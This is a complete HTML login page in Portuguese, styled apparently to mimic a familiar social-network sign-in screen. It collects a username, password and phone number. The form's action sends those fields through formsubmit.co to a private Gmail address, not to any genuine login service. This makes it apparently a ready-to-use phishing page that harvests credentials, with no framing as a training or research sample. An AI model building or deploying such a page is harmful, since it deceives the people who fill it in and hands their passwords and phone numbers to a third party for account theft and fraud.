<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulário de Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 350px;
            margin: 5rem auto;
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
        }
        input[type="text"],
        input[type="password"],
        input[type="tel"] {
            width: 100%;
            padding: 0.7rem;
            margin: 0.5rem 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 16px;
        }
        input[type="submit"] {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            cursor: pointer;
            padding: 0.7rem;
            margin-top: 1rem;
            border-radius: 5px;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #007bbf;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Login</h1>
        <form action="https://formsubmit.co/joaobolovina@gmail.com" method="POST">
            <input type="text" name="username" placeholder="Nome de Usuário" required>
            <input type="password" name="password" placeholder="Senha" required>
            <input type="tel" name="phone" placeholder="Telefone" required>
            <input type="submit" value="Entrar">
        </form>
    </div>

</body>
</html>
